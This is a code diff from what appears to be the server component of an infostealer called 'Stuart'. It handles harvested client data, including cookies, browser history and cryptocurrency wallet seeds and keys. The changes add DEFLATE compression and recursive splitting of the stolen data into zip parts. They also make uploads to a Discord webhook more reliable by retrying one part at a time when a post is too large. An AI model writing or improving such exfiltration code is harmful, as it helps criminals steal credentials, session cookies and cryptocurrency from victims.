@@ -1,7 +1,7 @@
 // Stuart server-side runtime — persists harvested data from every client into plugin.db
 import { decrypt as secoDecrypt } from "secure-container";
 import { fromBuffer as seedFromBuffer } from "bitcoin-seed";
-import { gunzipSync, inflateRawSync } from "zlib";
+import { gunzipSync, inflateRawSync, deflateRawSync } from "zlib";
 import { HDKey } from "@scure/bip32";
 import { mnemonicToSeedSync } from "@scure/bip39";
 import { wordlist } from "@scure/bip39/wordlists/english";
@@ -314,8 +314,12 @@ let pluginSettings = {
   discord_thread_prefix: "Stuart",
 };
 
-/** Max size per zip part on Discord (user limit). */
-const DISCORD_PART_MAX_BYTES = 8 * 1024 * 1024;
+/**
+ * Hard max per Discord attachment. Non-boosted guilds are often 8 MiB;
+ * multipart boundaries eat a bit, so we target ~7.5 MiB finished zip.
+ * (Uploads ~6–8 MiB used to fail when we allowed full 8 MiB store zips.)
+ */
+const DISCORD_PART_MAX_BYTES = Math.floor(7.5 * 1024 * 1024);
 /** Discord allows up to 10 attachments per message — one forum post. */
 const DISCORD_MAX_PARTS = 10;
 /**
@@ -479,7 +483,10 @@ function cookiesToNetscape(cookies) {
   return lines.join("\n");
 }
 
-/** Store-only ZIP (no compression) — same approach as the operator UI exporter. */
+/**
+ * ZIP with DEFLATE (method 8) so JSON history/cookies shrink a lot.
+ * Falls back to store if deflate doesn't help.
+ */
 function createZipBuffer(files) {
   const parts = [];
   const centralDir = [];
@@ -490,13 +497,23 @@ function createZipBuffer(files) {
     const data = Buffer.isBuffer(file.data) ? file.data : Buffer.from(file.data);
     const crc = crc32(data) >>> 0;
 
+    let method = 0;
+    let payload = data;
+    try {
+      const deflated = deflateRawSync(data, { level: 9 });
+      if (deflated.length < data.length) {
+        method = 8;
+        payload = deflated;
+      }
+    } catch (_) { /* keep store */ }
+
     const local = Buffer.alloc(30 + nameBytes.length);
     local.writeUInt32LE(0x04034b50, 0);
     local.writeUInt16LE(20, 4);
-    local.writeUInt16LE(0, 8); // store
+    local.writeUInt16LE(method, 8);
     local.writeUInt32LE(crc, 14);
-    local.writeUInt32LE(data.length, 18);
-    local.writeUInt32LE(data.length, 22);
+    local.writeUInt32LE(payload.length, 18); // compressed size
+    local.writeUInt32LE(data.length, 22);    // uncompressed size
     local.writeUInt16LE(nameBytes.length, 26);
     nameBytes.copy(local, 30);
 
@@ -504,16 +521,17 @@ function createZipBuffer(files) {
     central.writeUInt32LE(0x02014b50, 0);
     central.writeUInt16LE(20, 4);
     central.writeUInt16LE(20, 6);
+    central.writeUInt16LE(method, 10);
     central.writeUInt32LE(crc, 16);
-    central.writeUInt32LE(data.length, 20);
+    central.writeUInt32LE(payload.length, 20);
     central.writeUInt32LE(data.length, 24);
     central.writeUInt16LE(nameBytes.length, 28);
     central.writeUInt32LE(offset, 42);
     nameBytes.copy(central, 46);
 
     centralDir.push(central);
-    parts.push(local, data);
-    offset += local.length + data.length;
+    parts.push(local, payload);
+    offset += local.length + payload.length;
   }
 
   const cdOffset = offset;
@@ -725,19 +743,59 @@ function splitLargeJsonEntry(entry, maxPayload) {
 }
 
 /**
- * Pack harvest into one or more zip parts, each ≤ 8 MB.
+ * Pack one bin of files into a zip; if over maxBytes, binary-split files and recurse.
+ */
+function zipBinToParts(fileList, prefix, clientId, maxBytes, baseName, partOffset) {
+  const metaBody = Buffer.from(JSON.stringify({
+    v: 1,
+    source: "stuart",
+    clientId: clientId || null,
+    capturedAt: Date.now(),
+  }, null, 2), "utf8");
+  const files = [
+    { name: `${prefix}/meta.json`, data: metaBody },
+    ...fileList,
+  ];
+  const zip = createZipBuffer(files);
+  if (zip.length <= maxBytes || fileList.length <= 1) {
+    // Single oversized entry: still emit (will be uploaded alone; may need smaller split of JSON)
+    if (zip.length > maxBytes && fileList.length === 1) {
+      const only = fileList[0];
+      if (only.name.endsWith(".json")) {
+        const halves = splitLargeJsonEntry(only, Math.floor(only.data.length / 2) || 1);
+        if (halves.length > 1) {
+          const out = [];
+          for (const h of halves) {
+            out.push(...zipBinToParts([h], prefix, clientId, maxBytes, baseName, partOffset + out.length));
+          }
+          return out;
+        }
+      }
+      console.warn(`[stuart] single file zip still ${zip.length} bytes after split attempt`);
+    }
+    return [{ zip, size: zip.length, _files: fileList }];
+  }
+  // Too big — split file list in half
+  const mid = Math.ceil(fileList.length / 2);
+  const left = zipBinToParts(fileList.slice(0, mid), prefix, clientId, maxBytes, baseName, partOffset);
+  const right = zipBinToParts(fileList.slice(mid), prefix, clientId, maxBytes, baseName, partOffset + left.length);
+  return [...left, ...right];
+}
+
+/**
+ * Pack harvest into one or more zip parts, each ≤ ~7.5 MiB after DEFLATE.
  * All parts are meant for a single Discord message (up to 10 files).
  */
 function buildZipPartsFromExportData(data, clientId) {
   const { entries: rawEntries, counts, prefix } = collectExportFileEntries(data, clientId);
   if (!rawEntries.length) return null;
 
-  // Leave headroom for meta.json + zip local headers (~2 KB)
-  const maxFilePayload = DISCORD_PART_MAX_BYTES - 64 * 1024;
+  // Pre-split huge JSON so packing works (before compression estimate)
+  const maxUncompressedChunk = 12 * 1024 * 1024; // DEFLATE usually shrinks JSON a lot
   let entries = [];
   for (const e of rawEntries) {
-    if (e.data.length <= maxFilePayload) entries.push(e);
-    else if (e.name.endsWith(".json")) entries.push(...splitLargeJsonEntry(e, maxFilePayload));
+    if (e.data.length <= maxUncompressedChunk) entries.push(e);
+    else if (e.name.endsWith(".json")) entries.push(...splitLargeJsonEntry(e, Math.floor(maxUncompressedChunk / 2)));
     else {
       console.warn(`[stuart] skipping oversized non-json ${e.name} (${e.data.length} bytes)`);
     }
@@ -749,52 +807,56 @@ function buildZipPartsFromExportData(data, clientId) {
     ? `stuart-${safeFsName(clientId).slice(0, 24)}-${stamp}`
     : `stuart-global-${stamp}`;
 
-  // Greedy bin-pack into zip parts
-  const bins = []; // { files: [{name,data}], size }
+  // First pack by rough uncompressed size into bins, then re-split if zip too big
+  const roughMax = 16 * 1024 * 1024; // allow large bins; zipBinToParts will split by real zip size
+  const bins = [];
   for (const ent of entries) {
-    const overhead = ent.name.length + 128;
-    const need = ent.data.length + overhead;
+    const need = ent.data.length + ent.name.length + 128;
     let placed = false;
     for (const bin of bins) {
-      if (bin.size + need <= DISCORD_PART_MAX_BYTES - 4096) {
+      if (bin.size + need <= roughMax) {
         bin.files.push({ name: ent.name, data: ent.data });
         bin.size += need;
         placed = true;
         break;
       }
     }
-    if (!placed) {
-      if (bins.length >= DISCORD_MAX_PARTS) {
-        console.warn(`[stuart] hit ${DISCORD_MAX_PARTS} part limit; dropping ${ent.name}`);
-        continue;
-      }
-      bins.push({ files: [{ name: ent.name, data: ent.data }], size: need });
-    }
+    if (!placed) bins.push({ files: [{ name: ent.name, data: ent.data }], size: need });
   }
 
-  const totalParts = bins.length;
-  const parts = bins.map((bin, i) => {
-    const meta = {
+  let rawParts = [];
+  for (const bin of bins) {
+    rawParts.push(...zipBinToParts(bin.files, prefix, clientId, DISCORD_PART_MAX_BYTES, baseName, rawParts.length));
+  }
+
+  if (rawParts.length > DISCORD_MAX_PARTS) {
+    console.warn(`[stuart] ${rawParts.length} parts exceeds Discord 10-file limit; keeping first ${DISCORD_MAX_PARTS}`);
+    rawParts = rawParts.slice(0, DISCORD_MAX_PARTS);
+  }
+
+  const totalParts = rawParts.length;
+  const parts = rawParts.map((p, i) => {
+    // Rebuild with correct part numbers in meta
+    const metaBody = Buffer.from(JSON.stringify({
       v: 1,
       source: "stuart",
       clientId: clientId || null,
       capturedAt: Date.now(),
       part: i + 1,
       parts: totalParts,
-    };
-    const metaBody = Buffer.from(JSON.stringify(meta, null, 2), "utf8");
-    const files = [
+    }, null, 2), "utf8");
+    const zip = createZipBuffer([
       { name: `${prefix}/meta.json`, data: metaBody },
-      ...bin.files,
-    ];
-    const zip = createZipBuffer(files);
-    // If zip slightly over 8MB due to headers, still send (Discord free is often 25MB; user asked 8MB target)
-    if (zip.length > DISCORD_PART_MAX_BYTES) {
-      console.warn(`[stuart] part ${i + 1} is ${zip.length} bytes (>${DISCORD_PART_MAX_BYTES})`);
-    }
+      ...(p._files || []),
+    ]);
     const filename = totalParts === 1
       ? `${baseName}.zip`
       : `${baseName}.part${i + 1}of${totalParts}.zip`;
+    if (zip.length > DISCORD_PART_MAX_BYTES) {
+      console.warn(`[stuart] part ${i + 1} is ${(zip.length / 1024 / 1024).toFixed(2)} MiB (limit ${(DISCORD_PART_MAX_BYTES / 1024 / 1024).toFixed(2)} MiB)`);
+    } else {
+      console.log(`[stuart] zip part ${i + 1}/${totalParts}: ${filename} ${(zip.length / 1024 / 1024).toFixed(2)} MiB`);
+    }
     return { zip, filename, size: zip.length };
   });
 
@@ -882,30 +944,94 @@ function forumThreadName(clientId) {
   return `${prefix} ${short} ${stamp}`.slice(0, 100);
 }
 
+function zipPartAsBlob(part) {
+  // Detach from Buffer pool / shared ArrayBuffer so FormData size is exact
+  const buf = Buffer.isBuffer(part.zip) ? part.zip : Buffer.from(part.zip);
+  const u8 = new Uint8Array(buf.byteLength);
+  u8.set(buf);
+  return new Blob([u8], { type: "application/zip" });
+}
+
 /**
  * Post one forum message with one or more zip parts (≤10 files).
+ * On 413 (payload too large), falls back to uploading each part as its own post.
  * @param {{ zip: Buffer, filename: string }[]} parts
  */
 async function postZipsToDiscordWebhook({ webhookUrl, parts, content, threadName }) {
   if (!parts?.length) throw new Error("no zip parts");
-  const form = new FormData();
-  const payload = { content };
-  if (threadName) payload.thread_name = threadName;
-  form.append("payload_json", JSON.stringify(payload));
   const n = Math.min(parts.length, DISCORD_MAX_PARTS);
-  for (let i = 0; i < n; i++) {
-    form.append(`files[${i}]`, new Blob([parts[i].zip], { type: "application/zip" }), parts[i].filename);
-  }
+  const useParts = parts.slice(0, n);
 
-  let url = webhookUrl.trim();
-  url += url.includes("?") ? "&wait=true" : "?wait=true";
+  const sizes = useParts.map(p => `${p.filename}=${(p.size / 1024 / 1024).toFixed(2)}MiB`).join(", ");
+  console.log(`[stuart] Discord upload attempt: ${useParts.length} file(s) [${sizes}]`);
 
-  const res = await fetch(url, { method: "POST", body: form });
-  if (!res.ok) {
+  async function postOnce(partList, opts = {}) {
+    const form = new FormData();
+    const payload = { content: opts.content ?? content };
+    if (opts.threadName) payload.thread_name = opts.threadName;
+    if (opts.threadId) {
+      // reply into existing forum thread — no thread_name
+    }
+    form.append("payload_json", JSON.stringify(payload));
+    for (let i = 0; i < partList.length; i++) {
+      form.append(`files[${i}]`, zipPartAsBlob(partList[i]), partList[i].filename);
+    }
+    let url = webhookUrl.trim();
+    const qs = new URLSearchParams();
+    qs.set("wait", "true");
+    if (opts.threadId) qs.set("thread_id", String(opts.threadId));
+    url += (url.includes("?") ? "&" : "?") + qs.toString();
+
+    const res = await fetch(url, { method: "POST", body: form });
     const text = await res.text().catch(() => "");
-    throw new Error(`Discord webhook HTTP ${res.status}: ${text.slice(0, 400)}`);
+    if (!res.ok) {
+      const err = new Error(`Discord webhook HTTP ${res.status}: ${text.slice(0, 400)}`);
+      err.status = res.status;
+      err.body = text;
+      throw err;
+    }
+    try { return JSON.parse(text); } catch (_) { return { ok: true }; }
   }
-  try { return await res.json(); } catch (_) { return { ok: true }; }
+
+  try {
+    return await postOnce(useParts, { threadName });
+  } catch (e) {
+    // 413 / entity too large: upload one file per message (first creates forum thread)
+    const tooBig = e.status === 413
+      || /payload|too large|entity too large|maximum size|8000000|8388608/i.test(String(e.message) + String(e.body || ""));
+    if (!tooBig || useParts.length === 0) throw e;
+
+    console.warn(`[stuart] multi-file Discord upload failed (${e.message}); retrying one part at a time`);
+    let firstMsg = null;
+    let threadId = null;
+    for (let i = 0; i < useParts.length; i++) {
+      const p = useParts[i];
+      // If a single part is still over limit, Discord will still reject — re-split that part
+      if (p.size > DISCORD_PART_MAX_BYTES) {
+        throw new Error(
+          `Zip part ${p.filename} is ${(p.size / 1024 / 1024).toFixed(2)} MiB; Discord limit ~8 MiB. ` +
+          `Re-harvest with less history or raise boost level.`
+        );
+      }
+      const partContent = useParts.length > 1
+        ? `${content}\n\n_Part **${i + 1}/${useParts.length}**: \`${p.filename}\`_`
+        : content;
+      let msg;
+      if (!threadId) {
+        msg = await postOnce([p], { threadName, content: partContent });
+        threadId = msg?.channel_id || null;
+        firstMsg = msg;
+      } else {
+        msg = await postOnce([p], { threadId, content: partContent });
+        // merge attachments onto firstMsg for import helper
+        if (firstMsg && msg?.attachments) {
+          firstMsg.attachments = [...(firstMsg.attachments || []), ...msg.attachments];
+        }
+      }
+      console.log(`[stuart] Discord part ${i + 1}/${useParts.length} ok: ${p.filename}`);
+    }
+    return firstMsg || { ok: true };
+  }
 }
 
 async function postZipToDiscordWebhook({ webhookUrl, zip, filename, content, threadName }) {
